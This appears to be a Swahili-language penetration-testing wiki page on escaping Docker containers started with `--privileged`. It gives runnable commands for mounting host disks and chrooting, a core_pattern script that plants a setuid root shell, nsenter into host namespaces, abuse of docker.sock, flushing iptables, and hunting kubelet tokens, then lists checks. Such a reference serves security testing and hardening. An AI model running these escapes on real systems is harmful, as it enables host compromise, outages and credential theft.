# Kutoroka kutoka kwa `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Container iliyoanzishwa kwa `--privileged` sio sawa na container ya kawaida yenye ruhusa moja au mbili za ziada. Kwa vitendo, `--privileged` hutumia au kudhoofisha baadhi ya kinga za default za runtime ambazo kawaida zinaweka workload mbali na rasilimali hatarishi za host. Athari halisi bado inategemea runtime na host, lakini kwa Docker matokeo ya kawaida ni:

- all capabilities zinatolewa
- vikwazo vya device cgroup vinatolewa
- many kernel filesystems hazitakuwa zikifungwa kama read-only
- default masked procfs paths hupotea
- seccomp filtering imezimwa
- AppArmor confinement imezimwa
- SELinux isolation imezimwa au inabadilishwa na label pana zaidi

Matokeo muhimu ni kwamba container ya privileged kawaida haina haja ya exploit ya kernel ya kisiri. Katika kesi nyingi inaweza tu kuingiliana na host devices, host-facing kernel filesystems, au runtime interfaces moja kwa moja kisha kupinduka (pivot) hadi shell ya host.

## Mambo Ambayo `--privileged` Hayabadili Moja kwa Moja

`--privileged` haiungi moja kwa moja namespaces za host PID, network, IPC, au UTS. Container iliyopo privileged bado inaweza kuwa na namespaces za kibinafsi. Hii ina maana baadhi ya mnyororo wa kutoroka yanahitaji sharti jingine kama:

- a host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Masharti hayo mara nyingi ni rahisi kuyatimiza katika misconfiguration halisi, lakini kwa dhana ni tofauti kabisa na `--privileged` yenyewe.

## Njia za Kutoroka

### 1. Mount The Host Disk Through Exposed Devices

Container ya privileged kawaida inaona node zaidi za device chini ya `/dev`. Ikiwa host block device inaonekana, njia rahisi ya kutoroka ni kuimount kisha `chroot` kwenye filesystem ya host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Ikiwa partition ya root haijaonekana wazi, orodhesha kwanza mpangilio wa block:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Ikiwa njia ya vitendo ni kuweka setuid helper kwenye host mount inayoweza kuandikwa badala ya `chroot`, kumbuka kwamba si kila filesystem inaheshimu bit ya setuid. Ukaguzi wa haraka wa uwezo upande wa host ni:
```bash
mount | grep -v "nosuid"
```
Hii ni muhimu kwa sababu njia zinazoweza kuandikwa chini ya filesystem za `nosuid` hazivutia sana kwa taratibu za kawaida za "drop a setuid shell and execute it later" workflows.

Ulinzi uliodhoofishwa unaotumiwa hapa ni:

- ufichuzi kamili wa vifaa
- uwezo mpana, hasa `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Mount Au Tumia Tena Host Bind Mount Na `chroot`

Ikiwa mfumo wa faili wa mzizi wa mwenyeji tayari umewekwa ndani ya container, au ikiwa container inaweza kuunda mount zinazohitajika kwa sababu ni privileged, shell ya mwenyeji mara nyingi iko umbali wa `chroot` moja tu:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ikiwa hakuna host root bind mount lakini host storage inafikika, tengeneza mmoja:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Njia hii inatumia:

- vikwazo vya mount vilivyodhoofishwa
- full capabilities
- ukosefu wa MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Matumizi mabaya ya `/proc/sys` au `/sys` inayoweza kuandikwa

Moja ya matokeo makubwa ya `--privileged` ni kwamba ulinzi wa procfs na sysfs unakuwa dhaifu zaidi. Hii inaweza kufichua host-facing kernel interfaces ambazo kawaida zimefichwa au zimechomwa read-only.

Mfano wa kawaida ni `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Njia nyingine zenye thamani kubwa ni pamoja na:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Njia hii inatumia vibaya:

- missing masked paths
- missing read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Tumia Full Capabilities kwa Mount- au Namespace-Based Escape

A privileged container inapata capabilities ambazo kawaida huondolewa kwenye standard containers, zikiwemo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, na nyingi nyingine. Hii mara nyingi inatosha kubadilisha local foothold kuwa host escape mara tu panapopo exposed surface nyingine.

Mfano rahisi ni mounting additional filesystems na using namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Ikiwa host PID pia imeshirikiwa, hatua inakuwa fupi zaidi:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Njia hii inatumia vibaya:

- seti chaguo-msingi ya privileged capabilities
- kushiriki kwa hiari PID ya host

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Kutoroka Kupitia Runtime Sockets

Container yenye privileged mara nyingi huishia kuwa na hali ya runtime ya host au sockets zinazoonekana. Ikiwa socket ya Docker, containerd, au CRI-O inapatikana, mbinu rahisi mara nyingi ni kutumia runtime API kuanzisha container ya pili yenye ufikiaji wa host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kwa containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Njia hii inatumia vibaya:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Ondoa Madhara ya Utengwa wa Mtandao

`--privileged` yenyewe haiungani na host network namespace, lakini ikiwa container pia ina `--network=host` au ufikiaji mwingine wa host-network, network stack nzima inakuwa inaweza kubadilishwa:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Hii si mara zote host shell ya moja kwa moja, lakini inaweza kusababisha denial of service, traffic interception, au access kwa loopback-only management services.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Kusoma Host Secrets na Runtime State

Hata wakati clean shell escape sio ya papo hapo, privileged containers mara nyingi zina access ya kutosha kusoma host secrets, kubelet state, runtime metadata, na neighboring container filesystems:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Ikiwa `/var` imehost-mounted au runtime directories zinaonekana, hii inaweza kutosha kwa lateral movement au cloud/Kubernetes credential theft hata kabla host shell inapopatikana.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Ukaguzi

Madhumuni ya amri zifuatazo ni kuthibitisha ni familia gani za privileged-container escape zinazoweza kutumika mara moja.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Kinachovutia hapa:

- seti kamili ya capabilities, hasa `CAP_SYS_ADMIN`
- ufikiaji wa proc/sys unaoweza kuandikwa
- vifaa vya mwenyeji vinavyoonekana
- kukosekana kwa seccomp na ufungaji wa MAC
- sockets za runtime au bind mounts za host root

Moja kati ya hizi inaweza kutosha kwa post-exploitation. Kadhaa kwa pamoja kawaida zina maana kwamba container kwa vitendo iko amri moja au mbili tu mbali na host compromise.

## Related Pages

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
